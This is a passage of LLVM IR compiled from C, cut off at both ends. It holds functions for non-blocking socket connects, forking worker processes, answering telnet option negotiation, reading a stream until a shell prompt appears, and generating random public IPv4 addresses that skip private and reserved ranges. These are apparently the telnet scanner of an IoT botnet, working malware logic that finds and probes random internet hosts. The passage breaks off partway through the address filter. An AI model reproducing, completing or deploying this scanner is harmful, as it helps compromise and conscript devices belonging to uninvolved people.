  %78 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 %77
  %79 = load i64, i64* %78, align 8
  %80 = or i64 %79, %73
  store i64 %80, i64* %78, align 8
  %81 = load i32, i32* %6, align 4
  %82 = add nsw i32 %81, 1
  %83 = call i32 @select(i32 %82, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %84 = icmp sgt i32 %83, 0
  br i1 %84, label %85, label %93

85:                                               ; preds = %69
  store i32 4, i32* %13, align 4
  %86 = load i32, i32* %6, align 4
  %87 = bitcast i32* %14 to i8*
  %88 = call i32 @getsockopt(i32 %86, i32 1, i32 4, i8* %87, i32* %13) #12
  %89 = load i32, i32* %14, align 4
  %90 = icmp ne i32 %89, 0
  br i1 %90, label %91, label %92

91:                                               ; preds = %85
  store i32 0, i32* %5, align 4
  br label %106

92:                                               ; preds = %85
  br label %94

93:                                               ; preds = %69
  store i32 0, i32* %5, align 4
  br label %106

94:                                               ; preds = %92
  br label %96

95:                                               ; preds = %45
  store i32 0, i32* %5, align 4
  br label %106

96:                                               ; preds = %94
  br label %97

97:                                               ; preds = %96, %37
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i32, i32, ...) @fcntl(i32 %98, i32 3, i8* null)
  %100 = sext i32 %99 to i64
  store i64 %100, i64* %15, align 8
  %101 = load i64, i64* %15, align 8
  %102 = and i64 %101, -2049
  store i64 %102, i64* %15, align 8
  %103 = load i32, i32* %6, align 4
  %104 = load i64, i64* %15, align 8
  %105 = call i32 (i32, i32, ...) @fcntl(i32 %103, i32 4, i64 %104)
  store i32 1, i32* %5, align 4
  br label %106

106:                                              ; preds = %97, %95, %93, %91, %36
  %107 = load i32, i32* %5, align 4
  ret i32 %107
}

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #12
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

8:                                                ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

10:                                               ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias align 16 i8* @malloc(i64 %15) #12
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %18

18:                                               ; preds = %34, %10
  %19 = load i32, i32* %4, align 4
  %20 = zext i32 %19 to i64
  %21 = load i64, i64* @numpids, align 8
  %22 = sub i64 %21, 1
  %23 = icmp ult i64 %20, %22
  br i1 %23, label %24, label %37

24:                                               ; preds = %18
  %25 = load i32*, i32** @pids, align 8
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = getelementptr inbounds i32, i32* %25, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32*, i32** %3, align 8
  %31 = load i32, i32* %4, align 4
  %32 = zext i32 %31 to i64
  %33 = getelementptr inbounds i32, i32* %30, i64 %32
  store i32 %29, i32* %33, align 4
  br label %34

34:                                               ; preds = %24
  %35 = load i32, i32* %4, align 4
  %36 = add i32 %35, 1
  store i32 %36, i32* %4, align 4
  br label %18, !llvm.loop !28

37:                                               ; preds = %18
  %38 = load i32, i32* %2, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i64, i64* @numpids, align 8
  %41 = sub i64 %40, 1
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  %43 = load i32*, i32** @pids, align 8
  %44 = bitcast i32* %43 to i8*
  call void @free(i8* %44) #12
  %45 = load i32*, i32** %3, align 8
  store i32* %45, i32** @pids, align 8
  %46 = load i32, i32* %2, align 4
  store i32 %46, i32* %1, align 4
  br label %47

47:                                               ; preds = %37, %8
  %48 = load i32, i32* %1, align 4
  ret i32 %48
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @negotiate(i32 %0, i8* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 %57, i8* %8, i64 1, i32 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 %59, i8* %61, i64 1, i32 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @matchPrompt(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i64 0, i64 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #11
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

11:                                               ; preds = %97, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #11
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %100

17:                                               ; preds = %11
  br label %18

18:                                               ; preds = %74, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %72

22:                                               ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, %28
  %30 = getelementptr inbounds i8, i8* %26, i64 %29
  %31 = load i8, i8* %30, align 1
  %32 = sext i8 %31 to i32
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %70, label %34

34:                                               ; preds = %22
  %35 = load i8*, i8** %3, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i32, i32* %7, align 4
  %40 = sext i32 %39 to i64
  %41 = sub i64 0, %40
  %42 = getelementptr inbounds i8, i8* %38, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 32
  br i1 %45, label %70, label %46

46:                                               ; preds = %34
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 13
  br i1 %57, label %70, label %58

58:                                               ; preds = %46
  %59 = load i8*, i8** %3, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i32, i32* %7, align 4
  %64 = sext i32 %63 to i64
  %65 = sub i64 0, %64
  %66 = getelementptr inbounds i8, i8* %62, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = icmp eq i32 %68, 10
  br label %70

70:                                               ; preds = %58, %46, %34, %22
  %71 = phi i1 [ true, %46 ], [ true, %34 ], [ true, %22 ], [ %69, %58 ]
  br label %72

72:                                               ; preds = %70, %18
  %73 = phi i1 [ false, %18 ], [ %71, %70 ]
  br i1 %73, label %74, label %77

74:                                               ; preds = %72
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %7, align 4
  br label %18, !llvm.loop !29

77:                                               ; preds = %72
  %78 = load i8*, i8** %3, align 8
  %79 = load i32, i32* %5, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %78, i64 %80
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = sub i64 0, %83
  %85 = getelementptr inbounds i8, i8* %81, i64 %84
  %86 = load i8, i8* %85, align 1
  %87 = sext i8 %86 to i32
  %88 = load i8*, i8** %4, align 8
  %89 = load i32, i32* %6, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %87, %93
  br i1 %94, label %95, label %96

95:                                               ; preds = %77
  store i32 1, i32* %2, align 4
  br label %101

96:                                               ; preds = %77
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %11, !llvm.loop !30

100:                                              ; preds = %11
  store i32 0, i32* %2, align 4
  br label %101

101:                                              ; preds = %100, %95
  %102 = load i32, i32* %2, align 4
  ret i32 %102
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @readUntil(i32 %0, i8* %1, i32 %2, i32 %3, i32 %4, i8* %5, i32 %6, i32 %7) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.fd_set*, align 8
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

33:                                               ; preds = %142, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

38:                                               ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

42:                                               ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

46:                                               ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

48:                                               ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %143

50:                                               ; preds = %48
  br label %51

51:                                               ; preds = %50
  store %struct.fd_set* %21, %struct.fd_set** %25, align 8
  store i32 0, i32* %24, align 4
  br label %52

52:                                               ; preds = %62, %51
  %53 = load i32, i32* %24, align 4
  %54 = zext i32 %53 to i64
  %55 = icmp ult i64 %54, 16
  br i1 %55, label %56, label %65

56:                                               ; preds = %52
  %57 = load %struct.fd_set*, %struct.fd_set** %25, align 8
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %57, i32 0, i32 0
  %59 = load i32, i32* %24, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 %60
  store i64 0, i64* %61, align 8
  br label %62

62:                                               ; preds = %56
  %63 = load i32, i32* %24, align 4
  %64 = add i32 %63, 1
  store i32 %64, i32* %24, align 4
  br label %52, !llvm.loop !31

65:                                               ; preds = %52
  br label %66

66:                                               ; preds = %65
  %67 = load i32, i32* %10, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %72 = load i32, i32* %10, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %10, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.fd_set* %21, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %22)
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %82, label %83

82:                                               ; preds = %66
  br label %143

83:                                               ; preds = %66
  %84 = load i8*, i8** %15, align 8
  %85 = load i32, i32* %18, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8* %87, i8** %23, align 8
  %88 = load i32, i32* %10, align 4
  %89 = load i8*, i8** %23, align 8
  %90 = call i64 @recv(i32 %88, i8* %89, i64 1, i32 0)
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %19, align 4
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %97, label %94

94:                                               ; preds = %83
  %95 = load i32, i32* %19, align 4
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %94, %83
  store i32 0, i32* %9, align 4
  br label %148

98:                                               ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %18, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 255
  br i1 %105, label %106, label %128

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = call i64 @recv(i32 %107, i8* %109, i64 2, i32 0)
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %117, label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %114, %106
  store i32 0, i32* %9, align 4
  br label %148

118:                                              ; preds = %114
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %18, align 4
  %121 = add nsw i32 %120, %119
  store i32 %121, i32* %18, align 4
  %122 = load i32, i32* %10, align 4
  %123 = load i8*, i8** %23, align 8
  %124 = call i32 @negotiate(i32 %122, i8* %123, i32 3)
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %127, label %126

126:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %148

127:                                              ; preds = %118
  br label %142

128:                                              ; preds = %98
  %129 = load i8*, i8** %15, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = call i8* @strstr(i8* %129, i8* %130) #11
  %132 = icmp ne i8* %131, null
  br i1 %132, label %140, label %133

133:                                              ; preds = %128
  %134 = load i32, i32* %12, align 4
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = load i8*, i8** %15, align 8
  %138 = call i32 @matchPrompt(i8* %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %136, %128
  store i32 1, i32* %20, align 4
  br label %143

141:                                              ; preds = %136, %133
  br label %142

142:                                              ; preds = %141, %127
  br label %33, !llvm.loop !32

143:                                              ; preds = %140, %82, %48
  %144 = load i32, i32* %20, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %147

146:                                              ; preds = %143
  store i32 1, i32* %9, align 4
  br label %148

147:                                              ; preds = %143
  store i32 0, i32* %9, align 4
  br label %148

148:                                              ; preds = %147, %146, %126, %117, %97
  %149 = load i32, i32* %9, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %27

7:                                                ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %27

11:                                               ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = add i8 %12, 1
  store i8 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %14 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %17 = zext i8 %16 to i32
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %23 = zext i8 %22 to i32
  %24 = call i32 (i8*, i8*, ...) @szprintf(i8* %15, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i64 0, i64 0), i32 %17, i32 %19, i32 %21, i32 %23)
  %25 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %26 = call i32 @inet_addr(i8* %25) #12
  store i32 %26, i32* %1, align 4
  br label %565

27:                                               ; preds = %7, %0
  %28 = call i32 @rand() #12
  %29 = srem i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %31 = call i32 @rand() #12
  %32 = srem i32 %31, 255
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %34 = call i32 @rand() #12
  %35 = srem i32 %34, 255
  %36 = trunc i32 %35 to i8
  store i8 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %37 = call i32 @rand() #12
  %38 = srem i32 %37, 255
  %39 = trunc i32 %38 to i8
  store i8 %39, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %40

40:                                               ; preds = %538, %27
  %41 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %536, label %44

44:                                               ; preds = %40
  %45 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  br i1 %47, label %536, label %48

48:                                               ; preds = %44
  %49 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 100
  br i1 %51, label %52, label %60

52:                                               ; preds = %48
  %53 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %54 = zext i8 %53 to i32
  %55 = icmp sge i32 %54, 64
  br i1 %55, label %56, label %60

56:                                               ; preds = %52
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %58 = zext i8 %57 to i32
  %59 = icmp sle i32 %58, 127
  br i1 %59, label %536, label %60

60:                                               ; preds = %56, %52, %48
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 127
  br i1 %63, label %536, label %64

64:                                               ; preds = %60
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 169
  br i1 %67, label %68, label %72

68:                                               ; preds = %64
  %69 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %70 = zext i8 %69 to i32
  %71 = icmp eq i32 %70, 254
  br i1 %71, label %536, label %72

72:                                               ; preds = %68, %64
  %73 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %74 = zext i8 %73 to i32
  %75 = icmp eq i32 %74, 172
  br i1 %75, label %76, label %84

76:                                               ; preds = %72
  %77 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %78 = zext i8 %77 to i32
  %79 = icmp sle i32 %78, 16
  br i1 %79, label %80, label %84

80:                                               ; preds = %76
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp sle i32 %82, 31
  br i1 %83, label %536, label %84

84:                                               ; preds = %80, %76, %72
  %85 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %86 = zext i8 %85 to i32
  %87 = icmp eq i32 %86, 192
  br i1 %87, label %88, label %96

88:                                               ; preds = %84
  %89 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %96

92:                                               ; preds = %88
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 2
  br i1 %95, label %536, label %96

96:                                               ; preds = %92, %88, %84
  %97 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 192
  br i1 %99, label %100, label %108

100:                                              ; preds = %96
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 88
  br i1 %103, label %104, label %108

104:                                              ; preds = %100
  %105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 99
  br i1 %107, label %536, label %108

108:                                              ; preds = %104, %100, %96
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 192
  br i1 %111, label %112, label %116

112:                                              ; preds = %108
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 168
  br i1 %115, label %536, label %116

116:                                              ; preds = %112, %108
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %128

120:                                              ; preds = %116
  %121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 18
  br i1 %123, label %536, label %124

124:                                              ; preds = %120
  %125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %126 = zext i8 %125 to i32
  %127 = icmp eq i32 %126, 19
  br i1 %127, label %536, label %128

128:                                              ; preds = %124, %116
  %129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 198
  br i1 %131, label %132, label %140

132:                                              ; preds = %128
  %133 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %134 = zext i8 %133 to i32
  %135 = icmp eq i32 %134, 51
  br i1 %135, label %136, label %140

136:                                              ; preds = %132
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 100
  br i1 %139, label %536, label %140

140:                                              ; preds = %136, %132, %128
  %141 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %142 = zext i8 %141 to i32
  %143 = icmp eq i32 %142, 203
  br i1 %143, label %144, label %152

144:                                              ; preds = %140
  %145 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 0
  br i1 %147, label %148, label %152

148:                                              ; preds = %144
